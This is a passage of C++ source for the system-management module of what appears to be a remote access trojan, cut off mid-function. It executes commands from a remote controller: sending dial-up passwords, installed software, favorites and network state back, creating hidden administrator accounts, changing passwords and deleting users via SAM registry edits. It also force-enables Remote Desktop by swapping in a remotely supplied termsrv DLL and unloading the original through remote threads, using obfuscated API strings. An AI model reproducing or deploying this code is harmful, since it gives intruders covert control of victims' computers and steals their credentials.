// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "SystemManager.h"

#include <stdlib.h>

#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <Wtsapi32.h>
#pragma comment(lib,"Wtsapi32.lib")
#include <LM.h>
#pragma comment(lib,"netapi32")
#include "GetNetState.h"

#include "Dialupass.h"

extern HMODULE hDllModule;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
{
	SendProcessList();
	hSendMemoryThread= MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
}

CSystemManager::~CSystemManager()
{
	WaitForSingleObject(hSendMemoryThread, INFINITE);
	CloseHandle(hSendMemoryThread);
}

bool SwitchInputDesktop()
{
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}

void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	switch (lpBuffer[0])
	{
	case COMMAND_PSLIST:
		SendProcessList();
		break;
	case COMMAND_WSLIST:
		SendWindowsList();
		break;
	case COMMAND_KILLPROCESS:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendProcessList();
		break;
	case COMMAND_DSLIST:   //获取拨号密码
		SendDialupassList();
		break;
	case COMMAND_SOFTWARELIST:
		SendSoftWareList();
		break;
	case COMMAND_FULIST:
		SendFavoritesUrlList();
		break;
	case COMMAND_NSLIST:
		SendNetStateList();
		break;
	case COMMAND_KILLPROCESS_WINDOW:
		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
		SendWindowsList();	
		break;
	case COMMAND_WINDOW_TEST:
		TestWindow(lpBuffer+1);   
		break;
	case COMMAND_WINDOW_CLOSE:  //向窗口发送关闭消息
		CloseWindow(lpBuffer+1);  
		break;
	case COMMAND_SSLIST:
		SendSysInfoList();
		break;
	case COMMAND_USLIST:
		SendSysUserList();
		break;
	case COMMAND_ASLIST:
		SendUserStateList();
		break;
	case COMMAND_ACITVEUSER:
		ChangeUserState((LPBYTE)lpBuffer + 1, nSize - 1, NULL);  
		break;
	case COMMAND_DISABLEEUSER:
		ChangeUserState((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);  
		break;
	case COMMAND_CHANGE_USERPASS:
		ChangeUserPass((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DELUSER:
		DeleteUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_DISCONNECTUSER:
		DisconnectUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_LOGOFF_USER:
		LogOffUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_NET_USER: // 无NET加用户
		NoNetAddUser((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_3389_PORT:
		Change3389Port(lpBuffer + 1);
		break;
	case COMMAND_OPEN_3389:
		Open3389();
		break;
	case COMMAND_SEND_TERMSRV:
		if(WriteTermsrv(lpBuffer + 1,nSize -1))
		{
			BYTE bToken = TOKEN_TERMSRV_OK;
			Send(&bToken,sizeof(bToken));
		}
		break;
	case COMMAND_S_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	default:
		break;
	}
}

BOOL bIsOsXP()
{
	OSVERSIONINFOEX OsVerInfoEx;
	OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型
	return OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1;
}

void CSystemManager::GetTermsrvFile()
{
	BYTE bToken = TOKEN_GET_TERMSRV;
	Send(&bToken,sizeof(bToken));
}

BOOL CSystemManager::WriteTermsrv(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR		lpDllName[MAX_PATH];
	GetSystemDirectory(lpDllName, MAX_PATH);
	lstrcat(lpDllName, "\\termsrv_t.dll");
	
	HANDLE hFile; 
	DWORD  dwBytesWritten;
	hFile = CreateFile(lpDllName,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,NULL,NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;
    if(!WriteFile(hFile, lpBuffer, nSize, &dwBytesWritten, NULL)) 
		return false;
	CloseHandle(hFile); 

	Open3389();
	
	return true;
}


bool UnloadRemoteModule(DWORD dwProcessID, HANDLE hModuleHandle)
{
	HANDLE hRemoteThread;
	HANDLE hProcess;
	
	if (hModuleHandle == NULL)
		return false;
	hProcess=OpenProcess(PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION, FALSE, dwProcessID);
	if (hProcess == NULL)
		return false;
	
	char ExUmf[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	
	char TjHbd[] = {'F','r','e','e','L','i','b','r','a','r','y','\0'};
	
	HMODULE hModule=GetModuleHandle(ExUmf);
	LPTHREAD_START_ROUTINE pfnStartRoutine = (LPTHREAD_START_ROUTINE)::GetProcAddress(hModule, TjHbd);
	hRemoteThread=CreateRemoteThread(hProcess, NULL, 0, pfnStartRoutine, hModuleHandle, 0, NULL);
	
	if(hRemoteThread==NULL)
	{
		CloseHandle(hProcess);
		return false;
	}
	WaitForSingleObject(hRemoteThread,INFINITE);
	CloseHandle(hProcess);
	CloseHandle(hRemoteThread);
	return true;
}

HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath)
{
	HANDLE hModuleHandle = NULL;
	MODULEENTRY32 me32 = {0};
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
	me32.dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(hModuleSnap, &me32))
	{
		do
		{	
			if (lstrcmpi(me32.szExePath, lpModulePath) == 0)
			{
				hModuleHandle = me32.hModule;
				break;
			}
		}while(::Module32Next(hModuleSnap,&me32));
	}
	::CloseHandle(hModuleSnap);
	return hModuleHandle;
}


bool UnloadModule(LPCTSTR lpModulePath)
{
	BOOL bRet = false;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(pe32);
	
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	
	//查找相关的进程
	if(Process32First(hProcessSnap, &pe32))
	{
		do
		{
			HANDLE hModuleHandle = FindModule(pe32.th32ProcessID, lpModulePath);
			if (hModuleHandle != NULL)
			{
				bRet = UnloadRemoteModule(pe32.th32ProcessID, hModuleHandle);
			}
		}while (Process32Next(hProcessSnap,&pe32));
	}
	CloseHandle(hProcessSnap);
	return bRet;
}

bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if (!IsWindowVisible(hwnd))
		return true;
	
	DWORD dwWindowThreadId = NULL;
	DWORD dwLsassId = (DWORD)lParam;
	GetWindowThreadProcessId(hwnd, &dwWindowThreadId);
	if (dwWindowThreadId == (DWORD)lParam)
	{
		// 关闭指定进程的窗口
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return true;
}
DWORD GetProcessId(LPCTSTR szProcName)
{
	PROCESSENTRY32 pe; 
	DWORD dwPid;
	DWORD dwRet;
	BOOL bFound = FALSE;
	
	HANDLE hSP = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSP)
	{
		pe.dwSize = sizeof( pe );
		
		for (dwRet = Process32First(hSP, &pe); dwRet; dwRet = Process32Next(hSP, &pe))
		{
			if (lstrcmpi( szProcName, pe.szExeFile) == 0)
			{
				dwPid = pe.th32ProcessID;
				bFound = TRUE;
				break;
			}
		}
		CloseHandle(hSP);
		
		if (bFound == TRUE)
		{
			return dwPid;
		}
	}
	return NULL;
}

void HijackService()
{
	TCHAR strDll[MAX_PATH];
	GetSystemDirectory(strDll, sizeof(strDll));
	lstrcat(strDll, "\\termsrv.dll");
	
	// 遍历进程卸载现在加载的DLL
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	if (!UnloadModule(strDll))
		return;
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	// 关闭要弹出的出错对话框和因DLL强制卸载使一些服务异常终止而弹出来的自动关机对话框
	// 对进程赋予关闭权限
	CSystemManager::DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	DWORD dwLsassId = GetProcessId("csrss.exe");
	while (!AbortSystemShutdown(NULL))
	{
		// 一些系统是会弹出drwtsn32.exe
		DWORD dwDrwtsn32Id = GetProcessId("drwtsn32.exe");
		if (dwDrwtsn32Id != NULL)
		{
			EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwDrwtsn32Id);
		}
		// 模块强制卸载时会出错，关闭csrss.exe进程弹出的出错窗口
		EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)dwLsassId);
		Sleep(10);
	}
	CSystemManager::DebugPrivilege(SE_SHUTDOWN_NAME, FALSE);
}

void OnStartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}
void CSystemManager::SendNetStateList()
{
	LPBYTE	lpBuffer = getNetStateList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CSystemManager::SendFavoritesUrlList()
{
	LPBYTE	lpBuffer = getFavoritesUrlList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE	lpFUBuffer = NULL;
DWORD	dwFUOffset = 1; // 位移指针
void FindFavoritesUrl(char* searchfilename)
{
	char favpath[MAX_PATH] = {0};
	char tmpPath[MAX_PATH] = {0};
	DWORD	dwFULength = 0;
	
	lstrcat(favpath,searchfilename);
	lstrcat(favpath,"\\*.*");
	
	WIN32_FIND_DATA fd;
	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));  
	
	HANDLE hFind = FindFirstFile(favpath, &fd); // 文件后缀都是 url
	do 
	{
		if (fd.cFileName[0] != '.')
		{
			strcpy(tmpPath, searchfilename);  
			strcat(tmpPath, "\\");  
			strcat(tmpPath, fd.cFileName);  
			if( fd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY )   
			{  
				
				FindFavoritesUrl(tmpPath);  
			}else if (strstr(fd.cFileName, ".url"))
			{
				//				printf("文件名 ： %s 匹配 \r\n",fd.cFileName);
				
				TCHAR buf[MAX_PATH] = {0};
				::GetPrivateProfileString("InternetShortcut", "URL", "", buf, sizeof(buf), tmpPath);
				
				
				dwFULength = lstrlen(buf) + lstrlen(fd.cFileName) + 2;
				
				if (LocalSize(lpFUBuffer) < (dwFUOffset + dwFULength))
					lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, (dwFUOffset + dwFULength) + 1024, LMEM_ZEROINIT|LMEM_MOVEABLE);
				
				memcpy(lpFUBuffer + dwFUOffset, fd.cFileName, lstrlen(fd.cFileName) + 1);
				dwFUOffset += lstrlen(fd.cFileName) + 1;
				
				memcpy(lpFUBuffer + dwFUOffset, buf, lstrlen(buf) + 1);
				dwFUOffset += lstrlen(buf) + 1;
				
			}
		}
	} while(FindNextFile(hFind, &fd) );
	FindClose(hFind);	
}
LPBYTE CSystemManager::getFavoritesUrlList()
{
	char favpath[MAX_PATH] = {0};
	
	// 从注册表获取收藏夹所在位置
    HKEY hKEY;
	DWORD type=REG_SZ;
	LPCTSTR path="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
    DWORD cbData=80;
	::RegOpenKeyEx(HKEY_CURRENT_USER,path,0,KEY_READ,&hKEY);
	::RegQueryValueEx(hKEY,"Favorites",NULL,&type,(LPBYTE)favpath,&cbData);
	::RegCloseKey(hKEY);
	
	
	lpFUBuffer = (LPBYTE)LocalAlloc(LPTR, 10000);
	lpFUBuffer[0] = TOKEN_FULIST;
	dwFUOffset = 1;
	
    FindFavoritesUrl(favpath);
	
	lpFUBuffer = (LPBYTE)LocalReAlloc(lpFUBuffer, dwFUOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
	return lpFUBuffer;
}

void CSystemManager::Open3389()
{
	if (bIsOsXP())
	{
		TCHAR szDllPath[MAX_PATH];
		GetSystemDirectory(szDllPath, sizeof(szDllPath));
		lstrcat(szDllPath, "\\termsrv_t.dll");
		
		if (GetFileAttributes(szDllPath) != -1)
		{
			HMODULE hLoad = LoadLibrary(szDllPath);
			if (hLoad)
				FreeLibrary(hLoad);
			else
			{
				GetTermsrvFile();
				return;
			}
		}
		else
		{
			GetTermsrvFile();
			return; 
		}
	}
	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ShutdownWithoutLogon", REG_DWORD, NULL, 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", REG_DWORD, NULL, 1, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "KeepRASConnections", REG_SZ, "1", 0, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", REG_DWORD, NULL, 2, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "iKNVW", REG_DWORD, NULL, 2, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", REG_DWORD, NULL, 1, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core", "EnableConcurrentSessions", REG_DWORD, NULL, 1, 0);
	
	if (bIsOsXP())
	{
		
		WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters", "ServiceDll", REG_EXPAND_SZ,
			"%SystemRoot%\\system32\\termsrv_t.dll", 0, 0);
		HijackService();
	}
	OnStartService("TermService");
	Sleep(500);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", REG_DWORD, NULL, 0, 0);
}

BOOL CSystemManager::Change3389Port(LPVOID lparam)
{
	DWORD szPort=atoi((char*)lparam);
	if (szPort>65535 || szPort <= 0)
		return FALSE;
	
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	WriteRegEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\tcp", "PortNumber", REG_DWORD, NULL, szPort, 0);
	
	return TRUE;
}

wchar_t* AnsiToUnicode(char* str)
{
	if( !str )
		return NULL;
	
	int wcslen = ::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), NULL, 0);
	wchar_t *wstr = new wchar_t[wcslen + 1];
	::MultiByteToWideChar(CP_ACP, NULL, str, strlen(str), wstr, wcslen);
	wstr[wcslen] = '\0';
	
	return wstr;
}

void CSystemManager::DisconnectUser(LPBYTE lpBuffer, UINT nSize)
{
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSDisconnectSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	SendUserStateList();
}

void CSystemManager::LogOffUser(LPBYTE lpBuffer, UINT nSize)
{
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, TRUE);
	
	for (int i = 0; i < nSize; i += 4)
	{
		WTSLogoffSession(WTS_CURRENT_SERVER_HANDLE, *(LPDWORD)(lpBuffer + i) , FALSE );
	}
	CSystemManager::DebugPrivilege(SE_DEBUG_NAME, FALSE);
	
	SendUserStateList();
}

void CSystemManager::NoNetAddUser(LPBYTE lpBuffer, UINT nSize)
{
	USER_INFO_1 ui;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;
	
	TCHAR *lpUser = (TCHAR *)lpBuffer;
	TCHAR *lpPass = (TCHAR *)lpBuffer + ( (lstrlen(lpUser) + 1) * sizeof(TCHAR));
	TCHAR *lpGroup = (TCHAR *)lpBuffer + ( (lstrlen(lpPass) + 1) * sizeof(TCHAR) + (lstrlen(lpUser) + 1) * sizeof(TCHAR));
	
	ui.usri1_name = AnsiToUnicode(lpUser);    //这个是要添加的用户名，可以自己改改
	ui.usri1_password = AnsiToUnicode(lpPass);   //这个是用户密码，也可以自己改改
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; 
	ui.usri1_comment = NULL; 
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; 
	nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	
	if (nStatus != NERR_Success)
	{
		return;
	}
	wchar_t szAccountName[100]={0};  
	wcscpy(szAccountName,ui.usri1_name);  
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName;  
	
	//添加到Administrators组
	nStatus = NetLocalGroupAddMembers(NULL,AnsiToUnicode(lpGroup),3,(LPBYTE)&account,1);
	if (nStatus == NERR_Success)
	{
		SendSysUserList();
	}
	return;
}

void CSystemManager::DeleteUser(LPBYTE lpBuffer, UINT nSize)
{
	TCHAR *lpUserName =  (TCHAR*)lpBuffer;
	BYTE bToken = NULL;
	NET_API_STATUS nStatus;	
	nStatus = NetUserDel(NULL,AnsiToUnicode(lpUserName));
	if(nStatus==NERR_Success)
	{
		goto DELSUCCESS;
	}
	if(nStatus!=NERR_Success&&nStatus!=NERR_UserNotFound)
	{
		char strType[32]={0};
		TCHAR lpSubKey[128];
		wsprintf(lpSubKey,"SAM\\SAM\\Domains\\Account\\Users\\Names\\%s",lpUserName);
		
		if(!ReadRegEx(HKEY_LOCAL_MACHINE,lpSubKey,"",REG_BINARY,strType,NULL, sizeof(DWORD),0))
			return;
		
		if(WriteRegEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\Names\\", lpUserName, NULL, NULL, NULL, 2))
		{
			
			if(!WriteRegEx(HKEY_LOCAL_MACHINE, "SAM\\SAM\\Domains\\Account\\Users\\", strType, REG_SZ, NULL, NULL, 2))
				return;
			else
				goto DELSUCCESS;
		}
		else
			return;
	}
	
DELSUCCESS:
	SendSysUserList();
}

void CSystemManager::ChangeUserPass(LPBYTE lpBuffer, UINT nSize)
{
	BYTE bToken = NULL;
	TCHAR *lpUser =  (TCHAR*)lpBuffer;
	TCHAR *lpPass =  (TCHAR*)lpBuffer + ((lstrlen(lpUser) + 1) * sizeof(TCHAR));
	
	USER_INFO_3 *pUI=NULL;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;	
	
	nStatus=NetUserGetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE*)&pUI);
	
	pUI->usri3_flags = UF_NORMAL_ACCOUNT|UF_DONT_EXPIRE_PASSWD;
	pUI->usri3_password=AnsiToUnicode(lpPass);
	pUI->usri3_password_expired=FALSE;
	nStatus=NetUserSetInfo(NULL,AnsiToUnicode(lpUser),3,(LPBYTE)pUI,&dwError);
	
	if(nStatus==NERR_Success)
	{
		bToken = TOKEN_CHANGE_PSAA_SUCCESS;
		Send(&bToken, 1);
		LocalFree((LPBYTE)&bToken);
	}
	if (pUI != NULL)
		NetApiBufferFree(pUI);
}


void CSystemManager::ChangeUserState(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //帐户启用/停用
{
	wchar_t user_name[256]={0};
	USER_INFO_1008 ui;
	DWORD dwLevel = 1008;
	NET_API_STATUS nStatus;
	mbstowcs(user_name, (const char *)lpBuffer,256);
	if(User_kt==NULL)  //用户启用
		ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // 用户停用 | 密码用不过期
	else  //用户停用
		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // 用户停用 | 用户不能更改密码
	
	nStatus = NetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);
	if (nStatus == NERR_Success)
		SendSysUserList();
}

__int64 CompareFileTime ( FILETIME time1, FILETIME time2 )   
{   
	__int64 a = time1.dwHighDateTime << 32 | time1.dwLowDateTime ;   
	__int64 b = time2.dwHighDateTime << 32 | time2.dwLowDateTime ;   
	
	return   (b - a);   
}   
 
int GetCPUOcupPerc()   
{   
	HMODULE hModule_Kernel32 = LoadLibrary("kernel32.dll");
	typedef BOOL (WINAPI *TGetSystemTimes)(LPFILETIME,LPFILETIME,LPFILETIME); 
	TGetSystemTimes MyGetSystemTimes = (TGetSystemTimes) GetProcAddress(hModule_Kernel32, "GetSystemTimes");

    HANDLE hEvent;   
    BOOL res ;   
	
    FILETIME preidleTime;   
    FILETIME prekernelTime;   
    FILETIME preuserTime;   
	
    FILETIME idleTime;   
    FILETIME kernelTime;   
    FILETIME userTime;   
	
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    preidleTime = idleTime;   
    prekernelTime = kernelTime;   
    preuserTime = userTime ;   
	
    Sleep(1000);
    res = MyGetSystemTimes( &idleTime, &kernelTime, &userTime );   
	
    int idle = CompareFileTime( preidleTime,idleTime);   
    int kernel = CompareFileTime( prekernelTime, kernelTime);   
    int user = CompareFileTime(preuserTime, userTime);   
	
    int cpu = (kernel +user - idle) *100/(kernel+user);   

	if (hModule_Kernel32)
		FreeLibrary(hModule_Kernel32);

    return cpu;   
}   

int GetMemOcpuPerc()   
{   
	MEMORYSTATUSEX statex;   
	
	statex.dwLength = sizeof (statex);   
	
	GlobalMemoryStatusEx (&statex);   
	
	return (int)statex.dwMemoryLoad;   
}  

DWORD WINAPI CSystemManager::SendCPUAndMemoryThread(LPVOID lparam)
{
	CSystemManager *pThis = (CSystemManager *)lparam;
	

	BYTE buf[20];
	while (pThis->m_pClient->IsRunning())
	{          
		Sleep(1000 * 3);

		ZeroMemory(buf,20);
		buf[0] = TOKEN_CPUMEMORY;
		
		int Mem = GetMemOcpuPerc();
		int cpu = GetCPUOcupPerc();
		memcpy(buf+1,(void*)&Mem,sizeof(DWORD));   //内存
		memcpy(buf+1+sizeof(DWORD),(void*)&cpu,sizeof(DWORD));
		
     	pThis->Send((unsigned char *)buf,sizeof(buf));
	}
	
	return true;
}

void CSystemManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;
	
	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

LPBYTE CSystemManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = {0};
	TCHAR regDisplayName[MAX_LEG] = {0};
	TCHAR regPublisher[MAX_LEG] = {0};
	TCHAR regDisplayVersion[MAX_LEG] = {0};
	TCHAR regInstallDate[MAX_LEG] = {0};
	TCHAR regUninstallString[MAX_LEG] = {0};

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if(lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_SOFTWARE;

	int n  = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = {0};
	if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS    ) 
	{
		if( RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL)    ==    ERROR_SUCCESS )
		{

			for( int i = 0; i < (int)dwRegNum; i++ ) 
			{    
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType; 
				HKEY hSubKey;
				if(  RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{
					
					dwRegSize = MAX_LEG;
					memset(regDisplayName,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayName", 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regBufferValue,0,MAX_LEG);
					// 取ParentKeyName键值,判断是否是补丁信息, 是补丁信息键值为"OperatingSystem"
					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if( lstrlen(regDisplayName) == 0 || lstrcmp( regBufferValue,"OperatingSystem") == 0 ) //判断是否是补丁信息 
					{
						continue;
					}

					
					dwRegSize = MAX_LEG;
					memset(regPublisher,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "Publisher", 0, &dwType,(LPBYTE)regPublisher, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regDisplayVersion,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "DisplayVersion", 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);

					
					dwRegSize = MAX_LEG;
					memset(regInstallDate,0,MAX_LEG);
					// 判断是否能在注册表中获取到安装时间, 否取子项创建时间
					if(RegQueryValueEx(hSubKey, "InstallDate", 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS )
					{
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal ;
						FileTimeToSystemTime(&fileLastTime,&sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						TCHAR tchTime[MAX_LEG] = {0};
						wsprintf(tchTime,"%d%02d%02d",stLocal.wYear,stLocal.wMonth,stLocal.wDay);
						lstrcpy(regInstallDate,tchTime);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString,0,MAX_LEG);
					RegQueryValueEx(hSubKey, "UninstallString", 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);
	

					// 缓冲区太小，再重新分配下
					dwLength = lstrlen(regDisplayName) + lstrlen(regPublisher) + lstrlen(regDisplayVersion) + lstrlen(regInstallDate) + lstrlen(regUninstallString) + 6;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);


					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) + 1);
			    	dwOffset += lstrlen(regDisplayName) + 1;

					memcpy(lpBuffer + dwOffset, regPublisher, lstrlen(regPublisher) + 1);
			    	dwOffset += lstrlen(regPublisher) + 1;

					memcpy(lpBuffer + dwOffset, regDisplayVersion, lstrlen(regDisplayVersion) + 1);
			    	dwOffset += lstrlen(regDisplayVersion) + 1;

					memcpy(lpBuffer + dwOffset, regInstallDate, lstrlen(regInstallDate) + 1);
			    	dwOffset += lstrlen(regInstallDate) + 1;

					memcpy(lpBuffer + dwOffset, regUninstallString, lstrlen(regUninstallString) + 1);
			    	dwOffset += lstrlen(regUninstallString) + 1;										
				}             
			}
		}
	}
	else 
	{
		return FALSE; //打开键失败
	}

	RegCloseKey(hKey);

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;
}

void CSystemManager::SendDialupassList()
{
	CDialupass	pass;
	
	int	nPacketLen = 0;
	int i;
	for (i = 0; i < pass.GetMax(); i++)
	{
		COneInfo	*pOneInfo = pass.GetOneInfo(i);
		for (int j = 0; j < STR_MAX; j++)
			nPacketLen += lstrlen(pOneInfo->Get(j)) + 1;
	}
	
	nPacketLen += 1;
